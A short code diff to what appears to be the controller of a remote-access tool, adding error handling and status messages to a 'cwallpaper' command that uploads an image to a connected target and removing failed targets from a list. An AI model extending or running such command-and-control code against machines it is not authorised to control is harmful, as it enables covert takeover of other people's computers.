@@ -291,15 +291,22 @@ def target_communication(target, ip):
 
             elif command[:10] == 'cwallpaper':
                 if isfile(command[11:]) == True:
-                    upload_file(target, command[11:])
-                    reliable_send(target, 'somedata')
-                    print('wallpaper changed')
+                    print("[*] Uploading Picture")
+                    try:
+
+                        upload_file(target, command[11:])
+                        reliable_send(target, 'somedata')
+                    except:
+                        print("[-] Something Wrong")
+                    else:
+                        print("[+] Wallpaper changed")
                 else:
-                    upload_file(target, command[11:])
-                    continue
+                    print("[-] File Not Found")
+                    
             else:
                 result = reliable_recv(target)
                 print(result)
+
     except:
         targets.remove(target)
         ips.remove(ip)
